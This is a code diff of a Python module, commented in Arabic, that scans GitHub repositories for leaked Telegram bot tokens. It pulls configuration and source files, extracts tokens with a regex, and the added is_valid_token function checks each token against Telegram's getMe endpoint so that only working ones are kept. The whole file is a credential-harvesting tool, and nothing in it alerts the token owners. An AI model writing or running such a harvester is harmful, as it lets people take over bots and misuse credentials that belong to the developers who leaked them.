@@ -1,6 +1,7 @@
 import re
 import os
 import logging
+import requests
 from github import Github, RateLimitExceededException
 
 # إعداد السجلات (Logs)
@@ -11,55 +12,66 @@ logger = logging.getLogger(__name__)
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 g = Github(GITHUB_TOKEN)
 
-# "ذاكرة" مؤقتة لمنع إرسال التوكنات المكررة لـ main.py أثناء عمل البوت
+# ذاكرة مؤقتة لمنع التكرار في الجلسة الواحدة
 session_seen_tokens = set()
+
+def is_valid_token(token):
+    """
+    وظيفة الفلترة: التحقق من أن التوكن يخص بوت تليجرام نشط.
+    تستخدم GET /getMe (طريقة سلبية لا تؤثر على البوت).
+    """
+    try:
+        url = f"https://api.telegram.org/bot{token}/getMe"
+        response = requests.get(url, timeout=5)
+        # إذا كان الرد 200، فالتوكن صالح
+        return response.status_code == 200
+    except Exception:
+        return False
 
 def search_for_tokens():
     """
-    محرك الصيد المتكامل
-    - متوافق مع Threading
-    - محصن ضد أخطاء الـ API
-    - يمنع تكرار إرسال التوكنات المكتشفة
+    محرك الصيد المتكامل مع نظام الفلترة
     """
     found_tokens = []
-    logger.info("Scanner Engine: Starting search sequence...")
+    logger.info("Scanner Engine: Starting search sequence with active filtering...")
 
     try:
-        # البحث عن المستودعات (20 نتيجة في كل دورة)
+        # البحث في المستودعات
         repositories = g.search_repositories(query="telegram_bot_token", sort="updated")[:20]
         
         for repo in repositories:
-            # فلترة الجودة: تجاهل المستودعات الضعيفة
+            # تجاهل المستودعات الضعيفة
             if repo.stargazers_count < 5:
                 continue
-            
-            logger.info(f"Scanning Repository: {repo.full_name}")
             
             try:
                 contents = repo.get_contents("")
                 for content in contents:
-                    # فحص كافة أنواع الملفات التي قد تحتوي على توكنات
-                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml', '.json', '.txt', '.conf')):
+                    # فحص الملفات
+                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml', '.json', '.txt')):
                         file_content = content.decoded_content.decode('utf-8', errors='ignore')
                         
-                        # استخراج التوكنات بنمط Regex الدقيق
+                        # استخراج التوكنات
                         tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
                         
                         for token in set(tokens):
-                            # إذا كان التوكن جديداً ولم نره في هذه الجلسة، أضفه للقائمة
+                            # إذا كان جديداً ولم نره من قبل
                             if token not in session_seen_tokens:
-                                session_seen_tokens.add(token)
-                                found_tokens.append(token)
-                                logger.info(f"New candidate found: {token[:10]}... in {repo.full_name}")
+                                # الفلترة: هل هذا التوكن يعمل فعلاً؟
+                                if is_valid_token(token):
+                                    session_seen_tokens.add(token)
+                                    found_tokens.append(token)
+                                    logger.info(f"Verified & Valid token found in {repo.full_name}")
+                                else:
+                                    logger.info(f"Filtered out invalid token from {repo.full_name}")
             
-            except Exception as e:
-                # تجاهل الخطأ في ملف واحد والاستمرار لباقي الملفات
+            except Exception:
                 continue
                 
     except RateLimitExceededException:
-        logger.critical("GitHub API limit reached! Sleeping to prevent ban.")
+        logger.warning("GitHub API limit reached!")
     except Exception as e:
-        logger.error(f"Critical Scanner Failure: {e}")
+        logger.error(f"Scanner Critical Error: {e}")
         
-    logger.info(f"Scanner Cycle Complete. Total unique new candidates: {len(found_tokens)}")
+    logger.info(f"Scanner Cycle Complete. Found {len(found_tokens)} valid new tokens.")
     return found_tokens
